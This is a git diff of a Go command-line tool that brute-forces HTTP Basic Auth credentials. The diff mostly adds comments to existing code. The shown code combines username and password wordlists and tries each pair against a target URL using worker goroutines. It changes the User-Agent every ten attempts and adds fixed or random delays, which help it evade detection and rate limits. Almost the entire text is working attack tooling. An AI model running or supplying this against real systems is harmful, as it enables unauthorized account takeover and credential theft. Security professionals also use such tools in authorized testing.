@@ -17,23 +17,29 @@ import (
 	"time"
 )
 
+// Global variables for command-line flags and other settings
 var rate int
 var randomagent, randomdelay bool
 var url, username, password string
 var start time.Time
 var delay int
 
+// Function to handle parsing errors
 func errorpars(err error) {
 	if err != nil {
 		log.Panic(err.Error())
 	}
 }
 
+// main function
 func main() {
 	start = time.Now()
 	runtime.GOMAXPROCS(1)
+	// Command-line interface setup using urfave/cli
 	app := &cli.App{
 		Flags: []cli.Flag{
+			// Flags for URL, username, password, rate limit, delay, and other options
+			// Each flag has a corresponding destination variable to store the value
 			&cli.StringFlag{
 				Name:        "url",
 				Value:       "",
@@ -85,6 +91,7 @@ func main() {
 			},
 		},
 		Action: func(cCtx *cli.Context) error {
+			// Switch case to handle different scenarios based on provided options
 			switch {
 			case cCtx.String("url") == "":
 				fmt.Println(color.Colorize(color.Red, "[-] Please Enter URL with -d"))
@@ -98,11 +105,11 @@ func main() {
 			return nil
 		},
 	}
-
+	// Run the CLI app
 	if err := app.Run(os.Args); err != nil {
 		log.Fatal(err)
 	}
-
+	// Open username and password wordlist files
 	usernamedic, err := os.OpenFile(username, os.O_RDONLY, 0600)
 	errorpars(err)
 	defer func(usernamedic *os.File) {
@@ -116,7 +123,7 @@ func main() {
 		err := passwordsdic.Close()
 		errorpars(err)
 	}(passwordsdic)
-
+	// Read content of wordlist files
 	usernamedicbyte, err := ioutil.ReadAll(usernamedic)
 	passwordsdicbyte, err := ioutil.ReadAll(passwordsdic)
 	linesuser := strings.Split(string(usernamedicbyte), "\r\n")
@@ -128,7 +135,7 @@ func main() {
 		user string
 		pass string
 	}, len(linesuser)*len(linespassw))
-	//var j int
+	// Check for conflicting options regarding delay
 	if delay != 0 && randomdelay {
 		log.Println(color.Colorize(color.Red, "[-] Choose one --delay or --random-delay"))
 		os.Exit(1)
@@ -164,25 +171,30 @@ func main() {
 
 }
 
+// Variables for workerRoutine
 var j int
 var Useragent string
 
+// workerRoutine function to perform the actual brute-force attacks
 func workerRoutine(jobs <-chan string, results chan<- struct{ user, pass string }, wg *sync.WaitGroup) {
 	defer wg.Done()
 	client := BasicAuthBruteForce.NewClient()
 
 	for job := range jobs {
 		j++
-		//	fmt.Println(j)
+		// Change User Agent after every 10 attempts
 		if j == 10 {
 			//make user agent
 			Useragent = BasicAuthBruteForce.Useragent(randomagent)
 			//	fmt.Printf(color.Colorize(color.Green, "-*- User Agent Changed to: \n %s -*- \n"), Useragent)
 			j = 0
 		}
+		// Split the job into username and password
 		userpass := strings.Split(job, ":")
 		user, pass := userpass[0], userpass[1]
+		// Set headers using the client
 		err := client.SetHeader(url, Useragent, user, pass)
+		// If the error is true, it means authentication was successful
 		if err {
 			results <- struct{ user, pass string }{user, pass}
 		}
@@ -191,7 +203,7 @@ func workerRoutine(jobs <-chan string, results chan<- struct{ user, pass string 
 
 			time.Sleep(time.Duration(delay) * time.Second)
 		}
-		//check if random delay set make random number and sleep
+		// Sleep with a random delay if randomdelay is set
 		if randomdelay {
 
 			rand.Seed(time.Now().UnixNano())
